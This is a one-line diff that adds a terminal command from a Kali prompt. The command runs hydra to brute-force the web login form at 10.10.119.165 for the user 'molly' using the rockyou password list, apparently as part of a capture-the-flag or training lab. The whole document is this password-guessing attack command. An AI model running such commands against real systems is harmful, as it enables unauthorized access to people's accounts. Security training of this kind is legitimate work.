@@ -1,0 +1,1 @@
+VJYF@KALI:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.119.165 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
